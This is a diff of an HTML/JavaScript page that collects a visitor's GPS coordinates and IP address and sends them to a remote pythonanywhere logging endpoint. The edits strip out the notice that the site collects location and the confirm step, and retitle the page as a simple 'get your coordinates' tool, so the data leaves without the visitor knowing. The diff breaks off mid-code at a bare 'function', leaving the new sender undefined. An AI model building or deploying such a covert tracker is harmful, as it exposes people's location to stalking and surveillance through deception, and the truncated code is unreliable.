@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Access</title>
+    <title>Location Capture</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
@@ -31,41 +31,39 @@
 <body>
 
 <div class="card">
-    <h3>Share Your Location</h3>
-    <p>This site will collect your location.</p>
+    <h3>Location Capture</h3>
+    <p>Click to get your current coordinates</p>
 
     <button onclick="start()">Allow & Continue</button>
 
     <p id="status"></p>
     <div id="result" style="margin-top:15px;"></div>
-    <button id="confirmBtn" onclick="confirmSend()" style="display:none;">Confirm</button>
 </div>
 
 <script>
+
 const PA_USER = "REPLACE_WITH_USERNAME";
 let sent = false;
 
 function start() {
-    document.getElementById("status").innerText = "Getting location...";
+    document.getElementById("status").innerText = "Getting GPS...";
 
     let data = {
         ip: "0.0.0.0",
         lat: "0",
         lon: "0",
-        type: "IP-Only"
+        type: "UNKNOWN"
     };
 
-    // 🔹 Get IP fallback
+    // fallback IP (optional)
     fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(json => {
         data.ip = json.ip;
-        data.lat = json.latitude;
-        data.lon = json.longitude;
     })
     .catch(() => {});
 
-    // 🔹 GPS with retry + fresh fetch
+    // GPS
     if (navigator.geolocation) {
 
         navigator.geolocation.getCurrentPosition(
@@ -75,13 +73,13 @@ function start() {
                 data.type = "GPS";
                 processData(data);
             },
-            () => {
+            (err) => {
                 // retry once
                 navigator.geolocation.getCurrentPosition(
                     (pos2) => {
                         data.lat = pos2.coords.latitude;
                         data.lon = pos2.coords.longitude;
-                        data.type = "GPS-Retry";
+                        data.type = "GPS-RETRY";
                         processData(data);
                     },
                     () => {
@@ -97,56 +95,26 @@ function start() {
         processData(data);
     }
 
-    // 🔹 safety fallback (never stuck)
+    // safety fallback
     setTimeout(() => {
         processData(data);
     }, 9000);
 }
 
-async function processData(data) {
+function processData(data) {
+
     if (sent) return;
     sent = true;
 
-    let address = "Unknown";
+    // 🔥 ONLY COORDINATES SHOWN
+    document.getElementById("result").innerHTML =
+        "📍 Latitude: " + data.lat +
+        "<br>📍 Longitude: " + data.lon;
 
-    try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}`);
-        const json = await res.json();
-        address = json.display_name;
-
-        document.getElementById("result").innerText = "Detected: " + address;
-        document.getElementById("confirmBtn").style.display = "block";
-
-    } catch (e) {
-        console.log("Address fetch failed");
-    }
-
-    // auto send after 5 sec
-    setTimeout(() => {
-        sendToServer(data, address);
-    }, 5000);
+    sendToServer(data);
 }
 
-function sendToServer(data, address) {
-    const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}&address=${encodeURIComponent(address)}`;
-
-    fetch(url)
-    .then(() => {
-        document.getElementById("status").innerText = "Sent ✅";
-    })
-    .catch(() => {
-        document.getElementById("status").innerText = "Error";
-    });
-}
-
-function confirmSend() {
-    const address = document.getElementById("result").innerText.replace("Detected: ", "");
-    sendToServer({lat:"",lon:"",ip:"",type:"Manual"}, address);
-}
-</script>
-
-</body>
-</html>
+function
 
 
 
